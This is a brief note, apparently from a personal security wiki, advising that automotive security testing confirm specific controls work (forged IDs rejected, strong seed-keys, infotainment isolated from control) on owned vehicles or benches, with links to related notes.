> Automotive testing is *whether controls work* -- "we fuzzed" differs from "forged IDs are rejected, seed-keys are strong, and IVI cannot reach control". Validate each control on owned vehicles/benches directly ([[62_Automotive_Security]], [[34_Hardware_Hacking]], [[48_Threat_Modeling]]).
